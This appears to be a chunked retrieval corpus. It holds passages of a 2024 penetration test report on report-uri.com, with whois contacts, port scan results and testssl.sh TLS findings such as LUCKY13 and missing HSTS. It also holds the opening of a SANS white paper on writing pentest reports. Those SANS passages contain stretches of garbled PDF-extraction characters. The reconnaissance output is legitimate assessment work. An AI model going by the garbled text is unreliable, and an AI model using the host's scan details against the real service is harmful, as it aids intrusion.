https://rdap.arin.net/registry/entity/CLOUD146-ARIN OrgTechHandle: ADMIN2521-ARIN OrgTechName: Admin OrgTechPhone: +1-650-319-8930 OrgTechEmail: rir@cloudflare.com OrgTechRef: https://rdap.arin.net/registry/entity/ADMIN2521-ARIN OrgAbuseHandle: ABUSE2916-ARIN OrgAbuseName: Abuse OrgAbusePhone: +1-650-319-8930 OrgAbuseEmail: abuse@cloudflare.com OrgAbuseRef: https://rdap.arin.net/registry/entity/ABUSE2916-ARIN OrgNOCHandle: CLOUD146-ARIN OrgNOCName: Cloudflare-NOC OrgNOCPhone: +1-650-319-8930 OrgNOCEmail: noc@cloudflare.com OrgNOCRef: https://rdap.arin.net/registry/entity/CLOUD146-ARIN RTechHandle: ADMIN2521-ARIN RTechName: Admin RTechPhone: +1-650-319-8930 RTechEmail: rir@cloudflare.com RTechRef: https://rdap.arin.net/registry/entity/ADMIN2521-ARIN RNOCHandle: NOC11962-ARIN RNOCName: NOC RNOCPhone: +1-650-319-8930 RNOCEmail:",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 4
    }
  },
  {
    "text": "noc@cloudflare.com OrgRoutingRef: https://rdap.arin.net/registry/entity/CLOUD146-ARIN OrgTechHandle: ADMIN2521-ARIN OrgTechName: Admin OrgTechPhone: +1-650-319-8930 OrgTechEmail: rir@cloudflare.com OrgTechRef: https://rdap.arin.net/registry/entity/ADMIN2521-ARIN OrgAbuseHandle: ABUSE2916-ARIN OrgAbuseName: Abuse OrgAbusePhone: +1-650-319-8930 OrgAbuseEmail: abuse@cloudflare.com OrgAbuseRef: https://rdap.arin.net/registry/entity/ABUSE2916-ARIN OrgNOCHandle: CLOUD146-ARIN OrgNOCName: Cloudflare-NOC OrgNOCPhone: +1-650-319-8930 OrgNOCEmail: noc@cloudflare.com OrgNOCRef: https://rdap.arin.net/registry/entity/CLOUD146-ARIN RTechHandle: ADMIN2521-ARIN RTechName: Admin RTechPhone: +1-650-319-8930 RTechEmail: rir@cloudflare.com RTechRef: https://rdap.arin.net/registry/entity/ADMIN2521-ARIN RNOCHandle: NOC11962-ARIN RNOCName: NOC RNOCPhone: +1-650-319-8930 RNOCEmail: noc@cloudflare.com RNOCRef: https://rdap.arin.net/registry/entity/NOC11962-ARIN RAbuseHandle: ABUSE2916-ARIN RAbuseName: Abuse RAbusePhone: +1-650-319-8930 RAbuseEmail: abuse@cloudflare.com RAbuseRef: https://rdap.arin.net/registry/entity/ABUSE2916-ARIN Confidential 14\\n6.2 Port Scan Results To offer a service to other computers, a “port” is made available. Each open port creates a communication channel which can pose a security risk that an attacker can enumerate information from, or at worst exploit to compromise the target. Best practices state that only the minimum number of open ports should be enabled to reduce the attack surface. 6.2.1 Target: 104.17.215.66 – report-uri.com Port State Service Product Version Extra 80/tcp open http cloudflare Unknown Unknown 443/tcp open https cloudflare Unknown Unknown 2052/tcp open clearvisn Unknown Unknown Unknown 2053/tcp open http nginx Unknown Unknown 2082/tcp open infowave Unknown Unknown Unknown 2083/tcp open http nginx Unknown Unknown 2086/tcp open gnunet Unknown Unknown Unknown 2087/tcp open http nginx Unknown Unknown 2095/tcp open nbx-ser Unknown Unknown Unknown 2096/tcp open http nginx Unknown Unknown 8080/tcp open http-proxy cloudflare Unknown Unknown 8443/tcp open https-alt cloudflare Unknown Unknown 8880/tcp open cddbp-alt Unknown Unknown Unknown Confidential 15\\n6.3 SSL/TLS Assessment Transport Layer Security (TLS) is used to ensure the confidentiality and integrity of traffic as it transits a network. It is also used to give certainty of the identity of the client, server, or both. Insecure configurations are common. The following sub-sections show information gathered using TestSSL. 6.3.1 TestSSL Results for: /testssl.sh --openssl bin/openssl.Linux.x86_64 --quiet --wide --log 104.17.215.66 Start 2024-11-19 11:20:42 -->> 104.17.215.66:443 (104.17.215.66) <<-- rDNS (104.17.215.66): -- Service detected: HTTP Testing protocols via sockets except NPN+ALPN SSLv2 not offered (OK) SSLv3 not offered (OK) TLS 1 not offered TLS 1.1 not offered TLS 1.2 offered (OK) TLS 1.3 offered (OK): final NPN/SPDY h2, http/1.1 (advertised) ALPN/HTTP2 h2, http/1.1 (offered) Testing cipher categories NULL ciphers (no encryption) not offered (OK) Anonymous NULL Ciphers (no authentication) not offered (OK) Export ciphers (w/o ADH+NULL) not offered (OK) LOW: 64 Bit + DES, RC[2,4], MD5 (w/o export) not offered (OK) Triple DES Ciphers / IDEA not offered Obsoleted CBC ciphers (AES, ARIA etc.) offered Strong encryption (AEAD ciphers) with no FS offered (OK) Forward Secrecy strong encryption (AEAD ciphers) offered (OK) Testing server's cipher preferences Hexcode Cipher Suite Name (OpenSSL) KeyExch. Encryption Bits Cipher Suite Name (IANA/RFC) ------------------------------------------------------------------------------------------- ---------------------------------- SSLv2 - SSLv3 - TLSv1 - TLSv1.1 - TLSv1.2 (server order -- server prioritizes ChaCha ciphers when preferred by clients) xc02b ECDHE-ECDSA-AES128-GCM-SHA256 ECDH 253 AESGCM 128 TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 xcca9 ECDHE-ECDSA-CHACHA20-POLY1305 ECDH 253 ChaCha20 256 TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 xc009 ECDHE-ECDSA-AES128-SHA ECDH 253 AES 128 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA xc02c ECDHE-ECDSA-AES256-GCM-SHA384 ECDH 253 AESGCM 256 TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 xc00a ECDHE-ECDSA-AES256-SHA ECDH 253 AES 256 TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA xc023 ECDHE-ECDSA-AES128-SHA256 ECDH 253 AES 128 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 xc024 ECDHE-ECDSA-AES256-SHA384 ECDH 253 AES 256 TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 Confidential 16\\nxc02f ECDHE-RSA-AES128-GCM-SHA256 ECDH 253 AESGCM 128 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 xcca8 ECDHE-RSA-CHACHA20-POLY1305 ECDH 253 ChaCha20 256 TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 5
    }
  },
  {
    "text": "xc009 ECDHE-ECDSA-AES128-SHA ECDH 253 AES 128 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA xc02c ECDHE-ECDSA-AES256-GCM-SHA384 ECDH 253 AESGCM 256 TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 xc00a ECDHE-ECDSA-AES256-SHA ECDH 253 AES 256 TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA xc023 ECDHE-ECDSA-AES128-SHA256 ECDH 253 AES 128 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 xc024 ECDHE-ECDSA-AES256-SHA384 ECDH 253 AES 256 TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 Confidential 16\\nxc02f ECDHE-RSA-AES128-GCM-SHA256 ECDH 253 AESGCM 128 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 xcca8 ECDHE-RSA-CHACHA20-POLY1305 ECDH 253 ChaCha20 256 TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 xc013 ECDHE-RSA-AES128-SHA ECDH 253 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA x9c AES128-GCM-SHA256 RSA AESGCM 128 TLS_RSA_WITH_AES_128_GCM_SHA256 x2f AES128-SHA RSA AES 128 TLS_RSA_WITH_AES_128_CBC_SHA xc030 ECDHE-RSA-AES256-GCM-SHA384 ECDH 253 AESGCM 256 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 xc014 ECDHE-RSA-AES256-SHA ECDH 253 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA x9d AES256-GCM-SHA384 RSA AESGCM 256 TLS_RSA_WITH_AES_256_GCM_SHA384 x35 AES256-SHA RSA AES 256 TLS_RSA_WITH_AES_256_CBC_SHA xc027 ECDHE-RSA-AES128-SHA256 ECDH 253 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 x3c AES128-SHA256 RSA AES 128 TLS_RSA_WITH_AES_128_CBC_SHA256 xc028 ECDHE-RSA-AES256-SHA384 ECDH 253 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 x3d AES256-SHA256 RSA AES 256 TLS_RSA_WITH_AES_256_CBC_SHA256 TLSv1.3 (no server order, thus listed by strength) x1302 TLS_AES_256_GCM_SHA384 ECDH 253 AESGCM 256 TLS_AES_256_GCM_SHA384 x1303 TLS_CHACHA20_POLY1305_SHA256 ECDH 253 ChaCha20 256 TLS_CHACHA20_POLY1305_SHA256 x1301 TLS_AES_128_GCM_SHA256 ECDH 253 AESGCM 128 TLS_AES_128_GCM_SHA256 Has server cipher order? yes (OK) -- only for < TLS 1.3 Negotiated protocol TLSv1.3 Negotiated cipher TLS_AES_256_GCM_SHA384, 253 bit ECDH (X25519) Testing robust forward secrecy (FS) -- omitting Null Authentication/Encryption, 3DES, RC4 FS is offered (OK) , ciphers follow (client/browser support is important here) Hexcode Cipher Suite Name (OpenSSL) KeyExch. Encryption Bits Cipher Suite Name (IANA/RFC) ------------------------------------------------------------------------------------------- ---------------------------------- x1302 TLS_AES_256_GCM_SHA384 ECDH 253 AESGCM 256 TLS_AES_256_GCM_SHA384 x1303 TLS_CHACHA20_POLY1305_SHA256 ECDH 253 ChaCha20 256 TLS_CHACHA20_POLY1305_SHA256 xc030 ECDHE-RSA-AES256-GCM-SHA384 ECDH 256 AESGCM 256 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 xc02c ECDHE-ECDSA-AES256-GCM-SHA384 ECDH 256 AESGCM 256 TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 xc028 ECDHE-RSA-AES256-SHA384 ECDH 256 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 xc024 ECDHE-ECDSA-AES256-SHA384 ECDH 256 AES 256 TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 xc014 ECDHE-RSA-AES256-SHA ECDH 256 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA xc00a ECDHE-ECDSA-AES256-SHA ECDH 256 AES 256 TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA xcca9 ECDHE-ECDSA-CHACHA20-POLY1305 ECDH 253 ChaCha20 256 TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 xcca8 ECDHE-RSA-CHACHA20-POLY1305 ECDH 253 ChaCha20 256 TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 x1301 TLS_AES_128_GCM_SHA256 ECDH 253 AESGCM 128 TLS_AES_128_GCM_SHA256 xc02f ECDHE-RSA-AES128-GCM-SHA256 ECDH 256 AESGCM 128 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 xc02b ECDHE-ECDSA-AES128-GCM-SHA256 ECDH 256 AESGCM 128 TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 Confidential 17\\nxc027 ECDHE-RSA-AES128-SHA256 ECDH 256 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 xc023 ECDHE-ECDSA-AES128-SHA256 ECDH 256 AES 128 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 xc013 ECDHE-RSA-AES128-SHA ECDH 256 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA xc009 ECDHE-ECDSA-AES128-SHA ECDH 256 AES 128 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA Elliptic curves offered: prime256v1 secp384r1 secp521r1 X25519 Testing server defaults (Server Hello) TLS extensions (standard) \"renegotiation info/#65281\" \"EC point formats/#11\" \"session ticket/#35\" \"status request/#5\" \"next protocol/#13172\" \"signed certificate timestamps/#18\" \"key share/#51\" \"supported versions/#43\" \"extended master secret/#23\" \"application layer protocol negotiation/#16\" \"compress_certificate/#27\" Session Ticket RFC 5077 hint 64800 seconds, session tickets keys seems to be rotated < daily SSL Session ID support yes Session Resumption Tickets: yes, ID: no TLS clock skew Random values, no fingerprinting possible Certificate Compression 0002/Brotli Client Authentication none Server Certificate #1 (in response to request w/o SNI) Signature Algorithm SHA256 with RSA Server key size RSA 2048 bits (exponent is 65537) Server key usage Digital Signature, Key Encipherment Server extended key usage TLS Web Server Authentication, TLS Web Client Authentication Serial 0366B5349812310CEE06E134DFC27D918DAF (OK: length 18) Fingerprints SHA1 59EFE1175AC1D020DF5DD7F4EC507F7510F22F50 SHA256 C60594A5D59820E4BBA32177F49884AE6AB13B6CF7F680BC84DB9C9458CD8048 Common Name (CN) report-uri.com subjectAltName (SAN) *.report-uri.com report-uri.com Trust (hostname) certificate does not match supplied URI Chain of trust Ok EV cert (experimental) no Certificate Validity (UTC) 86 >= 30 days (2024-11-16 06:24 --> 2025-02-14 06:24) ETS/\"eTLS\",",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 6
    }
  },
  {
    "text": "Web Client Authentication Serial 0366B5349812310CEE06E134DFC27D918DAF (OK: length 18) Fingerprints SHA1 59EFE1175AC1D020DF5DD7F4EC507F7510F22F50 SHA256 C60594A5D59820E4BBA32177F49884AE6AB13B6CF7F680BC84DB9C9458CD8048 Common Name (CN) report-uri.com subjectAltName (SAN) *.report-uri.com report-uri.com Trust (hostname) certificate does not match supplied URI Chain of trust Ok EV cert (experimental) no Certificate Validity (UTC) 86 >= 30 days (2024-11-16 06:24 --> 2025-02-14 06:24) ETS/\"eTLS\", visibility info not present Certificate Revocation List -- OCSP URI http://r10.o.lencr.org OCSP stapling offered, not revoked OCSP must staple extension -- DNS CAA RR (experimental) not offered Certificate Transparency yes (certificate extension) Certificates provided 2 Issuer R10 (Let's Encrypt from US) Intermediate cert validity #1: ok > 40 days (2027-03-12 23:59). R10 <-- ISRG Root X1 Intermediate Bad OCSP (exp.) Ok Server Certificate #2 (in response to request w/o SNI) Signature Algorithm ECDSA with SHA384 Server key size EC 256 bits (curve P-256) Server key usage Digital Signature Server extended key usage TLS Web Server Authentication, TLS Web Client Authentication Serial 04BC413080D4314D9B57B912A354A16D3D3E (OK: length 18) Fingerprints SHA1 F1FBA4AFC6616F3C00800F8B3277D1334537359A SHA256 C4191F04B29173B1C2895A49DC2F24082B5560FC58F9C3AE5EE51C446139C893 Common Name (CN) report-uri.com subjectAltName (SAN) *.report-uri.com report-uri.com Trust (hostname) certificate does not match supplied URI Chain of trust Ok EV cert (experimental) no Certificate Validity (UTC) 86 >= 30 days (2024-11-16 06:24 --> 2025-02-14 06:24) ETS/\"eTLS\", visibility info not present Confidential 18\\nCertificate Revocation List -- OCSP URI http://e6.o.lencr.org OCSP stapling offered, not revoked OCSP must staple extension -- DNS CAA RR (experimental) not offered Certificate Transparency yes (certificate extension) Certificates provided 2 Issuer E6 (Let's Encrypt from US) Intermediate cert validity #1: ok > 40 days (2027-03-12 23:59). E6 <-- ISRG Root X1 Intermediate Bad OCSP (exp.) Ok Testing HTTP header response @ \"/\" HTTP Status Code 403 Forbidden HTTP clock skew 0 sec from localtime Strict Transport Security not offered Public Key Pinning -- Server banner cloudflare Application banner -- Cookie(s) (none issued at \"/\") -- maybe better try target URL of 30x Security headers -- Reverse Proxy banner -- Testing vulnerabilities Heartbleed (CVE-2014-0160) not vulnerable (OK), no heartbeat extension CCS (CVE-2014-0224) not vulnerable (OK) Ticketbleed (CVE-2016-9244), experiment. not vulnerable (OK) ROBOT not vulnerable (OK) Secure Renegotiation (RFC 5746) supported (OK) Secure Client-Initiated Renegotiation not vulnerable (OK) CRIME, TLS (CVE-2012-4929) not vulnerable (OK) BREACH (CVE-2013-3587) no gzip/deflate/compress/br HTTP compression (OK) - only supplied \"/\" tested POODLE, SSL (CVE-2014-3566) not vulnerable (OK), no SSLv3 support TLS_FALLBACK_SCSV (RFC 7507) No fallback possible (OK), no protocol below TLS 1.2 offered SWEET32 (CVE-2016-2183, CVE-2016-6329) not vulnerable (OK) FREAK (CVE-2015-0204) not vulnerable (OK) DROWN (CVE-2016-0800, CVE-2016-0703) not vulnerable on this host and port (OK) make sure you don't use this certificate elsewhere with SSLv2 enabled services, see https://search.censys.io/search?resource=hosts&virtual_hosts=INCLUDE&q=C60594A5D59820E4BBA3 2177F49884AE6AB13B6CF7F680BC84DB9C9458CD8048 LOGJAM (CVE-2015-4000), experimental not vulnerable (OK): no DH EXPORT ciphers, no DH key detected with <= TLS 1.2 BEAST (CVE-2011-3389) not vulnerable (OK), no SSL3 or TLS1 LUCKY13 (CVE-2013-0169), experimental potentially VULNERABLE, uses cipher block chaining (CBC) ciphers with TLS. Check patches Winshock (CVE-2014-6321), experimental not vulnerable (OK) RC4 (CVE-2013-2566, CVE-2015-2808) no RC4 ciphers detected (OK) Running client simulations (HTTP) via sockets Browser Protocol Cipher Suite Name (OpenSSL) Forward Secrecy ------------------------------------------------------------------------------------------- ----- Android 6.0",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 7
    }
  },
  {
    "text": "SSL3 or TLS1 LUCKY13 (CVE-2013-0169), experimental potentially VULNERABLE, uses cipher block chaining (CBC) ciphers with TLS. Check patches Winshock (CVE-2014-6321), experimental not vulnerable (OK) RC4 (CVE-2013-2566, CVE-2015-2808) no RC4 ciphers detected (OK) Running client simulations (HTTP) via sockets Browser Protocol Cipher Suite Name (OpenSSL) Forward Secrecy ------------------------------------------------------------------------------------------- ----- Android 6.0 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) Android 7.0 (native) TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) Android 8.1 (native) TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 253 bit ECDH (X25519) Android 9.0 (native) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Android 10.0 (native) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Android 11 (native) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Confidential 19\\nAndroid 12 (native) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Chrome 79 (Win 10) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Chrome 101 (Win 10) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Firefox 66 (Win 8.1/10) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Firefox 100 (Win 10) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) IE 6 XP No connection IE 8 Win 7 No connection IE 8 XP No connection IE 11 Win 7 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) IE 11 Win 8.1 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) IE 11 Win Phone 8.1 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) IE 11 Win 10 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) Edge 15 Win 10 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 253 bit ECDH (X25519) Edge 101 Win 10 21H2 TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Safari 12.1 (iOS 12.2) TLSv1.3 TLS_CHACHA20_POLY1305_SHA256 253 bit ECDH (X25519) Safari 13.0 (macOS 10.14.6) TLSv1.3 TLS_CHACHA20_POLY1305_SHA256 253 bit ECDH (X25519) Safari 15.4 (macOS 12.3.1) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Java 7u25 No connection Java 8u161 TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) Java 11.0.2 (OpenJDK) TLSv1.3 TLS_AES_128_GCM_SHA256 256 bit ECDH (P- 256) Java 17.0.3 (OpenJDK) TLSv1.3 TLS_AES_256_GCM_SHA384 253 bit ECDH (X25519) go 1.17.8 TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) LibreSSL 2.8.3 (Apple) TLSv1.2 ECDHE-ECDSA-CHACHA20-POLY1305 253 bit ECDH (X25519) OpenSSL 1.0.2e TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) OpenSSL 1.1.0l (Debian) TLSv1.2 ECDHE-ECDSA-CHACHA20-POLY1305 253 bit ECDH (X25519) OpenSSL 1.1.1d (Debian) TLSv1.3 TLS_AES_256_GCM_SHA384 253 bit ECDH (X25519) OpenSSL 3.0.3 (git) TLSv1.3 TLS_AES_256_GCM_SHA384 253 bit ECDH (X25519) Apple Mail (16.0) TLSv1.2 ECDHE-ECDSA-AES128-GCM-SHA256 256 bit ECDH (P- 256) Thunderbird (91.9) TLSv1.3 TLS_AES_128_GCM_SHA256 253 bit ECDH (X25519) Rating (experimental) Rating specs (not complete) SSL Labs's 'SSL Server Rating Guide' (version 2009q from 2020-01-30) Specification documentation https://github.com/ssllabs/research/wiki/SSL-Server-Rating- Guide Protocol Support (weighted) 0 (0) Key Exchange (weighted) 0 (0) Cipher Strength (weighted) 0 (0) Final Score 0 Overall Grade M Grade cap reasons Grade capped to M. Domain name mismatch Grade capped to A. HSTS is not offered Done 2024-11-19 11:22:10 [ 90s] -->> 104.17.215.66:443 (104.17.215.66) <<-- Confidential 20\\n22 Great James St reet Holborn London WC1N 3ES +44 (0)161 233 0100",
    "metadata": {
      "doc_id": "Report URI - 2024 Penetration Test Report",
      "chunk_id": 8
    }
  },
  {
    "text": "WHITE PAPER Writing a Penetration Testing Report Mansour Alharbi Copyright SANS Institute 2021. Author Retains Full Rights. This paper was published by SANS Institute. Reposting is not permitted without express written permission.\\n! ! ! ! ! ! ! Writing a Penetration Testing Report ! ! ! ! GIAC (GPEN) Gold Certificationnstitute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# >( ! ( ! 1. Introduction ! ! ! A lot of currently available penetration testing resources lack report writing ! methodology and approach which leads to a very big gap in the penetration testing cycle. ! ! Report in its definition is a statement of the results of an investigation or of any matter on ! which definite information is required (Oxford English Dictionary). ! ! A penetration test is useless without something tangible to give to a client or ! executive officer. A report should detail the outcome of the test and, if you are making ! ! recommendations, document the recommendations to secure any high-risk systems ! (Whitaker & Newman, 2005). Report Writing is a crucial part for any service providers ! ! especially in IT service/ advisory providers. In pen-testing the final result is a report that ! shows the services provided, the methodology adopted, as well as testing results and ! ! recommendations. As one of the project managers at major electronics firm Said \"We ! don't actually manufacture anything. Most of the time, the tangible products of this ! ! department [engineering] are reports.\" There is an old saying that in the consulting ! business: “If you do not document it, it did not happen.” (Smith, LeBlanc & Lam, 2004) ! \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Many people consider business reports as dry, uninteresting documents, which take a great deal of time and efforts to prepare. The reality is that they are an essential part of doing business and one's ability to be proficient in this area is critical to the ability to pursue commercial success (McCarthy, 1979; Ronstadt, 1984; Thompson, 2003c). Penetration testing report presents the approach followed and the results of the vulnerability assessment and penetration test of a target system with a detailed recommendation of how to mitigate the risks. Target reader for the penetration testing report will vary, executive summary will be read by the senior management and the technical details will be read by the IT and/or information security responsible people. This paper begins with a conventional approach to develop a penetration testing report starting from collecting information, drafting the first report and ending with a professional report. As shown in figure 1 the penetration testing report writing stages are: Report planning, Information collection, writing the first draft and reviewing and finalization. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# O( ! ( ! ! ! ! ! !",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 0
    }
  },
  {
    "text": "with a professional report. As shown in figure 1 the penetration testing report writing stages are: Report planning, Information collection, writing the first draft and reviewing and finalization. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# O( ! ( ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! \" # $ ! % & ' ( # F)*ig)u&'re+! ,1:!- R.e/p0o!r.t -D1e2v!e1l.o0p3m!0en0t4 S5t!a.g5es6 7 ! 5 8 9 5!.467!:;83!-/;0!383;! Then in section 3, the paper provides the needed content each report normally has, what each of the contents is used for, and how this will help the target readers of the penetration testing report understand the content. Finally appendix A has a sample penetration testing report applying the approach described. The target reader for this paper is the technical penetration testers that need to enhance their capabilities in report writing. For the purpose of this paper, 2 servers have been configured and GPEN.KM will be the organization name. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# P( ! ( ! 2. Report Development Stages ! ! ! As shown in figure 1, these stages show a practice for the development of ! penetration testing report. ! ! ! 2.1. Report Planning ! ! ! Report objectives ! ! Report objectives help the reader to focus on the main points of the penetration ! testing and the report e.g. PCI compliance once the objectives are clear both the reader ! ! and the penetration tester(s) will know what exactly the aim of the project. This section ! explains why we conduct the penetration testing and the benefit of it. This may be found ! ! in the Request for Proposal, be part of risk analysis, be part of compliance or to know the ! current stat of the target testing environment. Sample report objectives can be found in ! section 1.2.Project Objectives in Appendix A Sample Penetration Testing Report. ! ! ! Time \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! Penetration tester(s) need(s) to exactly mention the testing time for many reasons. This may include: • In mission critical infrastructure the organization may need to make sure some key IT persons are available during the test in case some thing does wrong e.g. server crash. • In rapidly changing IT infrastructure, the changes need to be freeze in the penetration testing scope during the test to make sure that the testing is exactly assessing the current IT (the penetration testing scope). • Even though there is no 100% security, the report will show the risks in the penetration testing scope during this period of time any risks after this time may arise because of some changes in the IT infrastructure of changing in the configuration. Pen Tester needs to make sure that sufficient time is allotted in the project plan. Sample time table is shown in 1.4.Timeline in Appendix A Sample Penetration Testing",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 1
    }
  },
  {
    "text": "of time any risks after this time may arise because of some changes in the IT infrastructure of changing in the configuration. Pen Tester needs to make sure that sufficient time is allotted in the project plan. Sample time table is shown in 1.4.Timeline in Appendix A Sample Penetration Testing )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# Q( ! ( ! Report. On the other hand, during the project planning time of the report delivery needs ! ! to be carefully taken into consideration. Divide your report writing into tasks to simplify ! things and focus of them. Planning the report will help in delivering an effective report. ! ! Typically, 60% of your time should be spent writing the draft. Pen Tester needs to ! consider the client’s acceptance process as well as the fact that it may take longer than ! ! expected. ! ! Consider the target audiences ! ! Penetration testing reports usually have a number of target audiences/audience ! groups to reach, so a report will often have a hierarchical structure to support different ! ! levels of details. In designing the report form and style, the following target audience ! characteristics should be considered: ! ! • Their need for the report (i.e. operational planning, resource ! allocation, approval), ! ! • Position in the organization ! ! • Knowledge of the report topic(i.e. purpose), \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! • Responsibility or authority to make decision based on the report, and • Personal demographics (i.e. age, alliances, attitudes). Report audiences include Information Security Manager, Chief Information Security Officer, Information Technology Manager and technical teams. More information about the scope and target audiences can be found also in the scope of work of the assignment. Report classification Since Penetration Testing Report have sensitive information such as, servers IP addresses and its information, some applications information, vulnerability, threats, exploits and more, it should be considered to be in every high rank of confidentiality e.g. TOP SECRET and the report will be dealt with accordingly. The report classification will be based on the target organization information classification policy. )*+,%\"&(!.$*&/01(2$*&/0342*0.-5%2( ( ( @ 2021 SANS Institute Author Retains Full Rights\\n! ! (A&0#0+4(*(M:+:#&*#0%+(C:,#0+4(N:<%&# =( ! ( ! Report distribution ! ! The number of copies of the report, the report format (hardcopy, softcopy) and the ! ! delivery procedure should be carefully implemented to control the report distribution and ! make sure it only arrives to the right person in the right time based on the need to know ! ! the bases. Type of report delivery, number of copies and report distribution should be ! addressed in the scope of work. Hardcopies can be controlled by printing a limited ! ! number of copies attached with its number and the receiver name. Table 1 shows a ! sample table that can be utilized to control hardcopies. ! ! Copy No Department Name Date ! ! ! ! ! ! ! Table 1 Penetration Testing Report",
    "metadata": {
      "doc_id": "SANS Institute - Writing a Penetration Testing",
      "chunk_id": 2
    }
  },
  {
    "text": "by printing a limited ! ! number of copies attached with its number and the receiver name. Table 1 shows a ! sample table that can be utilized to control hardcopies. ! ! Copy No Department Name Date ! ! ! ! ! ! ! Table 1 Penetration Testing Report distribution control ! ! ! Each copy will formally hand over to the target person. Softcopy needs to be \"#$!%&'(#)*)&'+!,!-./0!.-12!1.03!0045!.567!5895!.467!:;83!-/;0!383;! carefully controlled in a secure server owned by the department that has requested the penetration testing service. Distributing the softcopy of the report normally will be controlled by the document owner (report owner) and it will be under his responsibility. Finally after submitting the report, the penetration tester should delete any available information that he have and inform the client that all related information has have been erased (This step should be clearly mentioned and agreed upon in the service agreement documents. As Andrew Whitaker and Daniel P. Newman (Whitaker & Newman, 2005) stated that 'your ethical 